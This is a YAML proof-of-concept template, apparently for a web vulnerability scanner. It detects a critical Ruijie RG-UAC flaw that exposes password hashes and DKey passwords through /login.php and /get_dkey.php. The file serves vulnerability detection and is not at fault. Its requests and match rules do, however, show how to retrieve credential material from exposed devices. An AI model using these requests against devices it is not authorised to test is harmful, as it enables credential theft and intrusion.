name: poc-yaml-ruijie-uac-cnvd-2021-14536
binding: d7d1d10b-5d67-4c4d-aaf8-22f127ccfb1d
manual: true
detail:
    author: jweny(https://github.com/jweny)
    links:
        - https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247483972&idx=1&sn=b51678c6206a533330b0279454335065
    vulnerability:
        id: CT-158842
        level: critical
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /login.php
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("<title>RG-UAC登录页面</title>") && response.body_string.contains("get_dkey_passwd") && '"password":"[a-f0-9]{32}"'.bmatches(response.body)
    r1:
        request:
            method: GET
            path: /get_dkey.php
            follow_redirects: false
        expression: response.status == 200 && '("DKey"|"dkey_password")\\s*:\\s*(.*),?'.bmatches(response.body) && "^\\[(.*)\\]$".bmatches(response.body)
expression: r0() || r1()
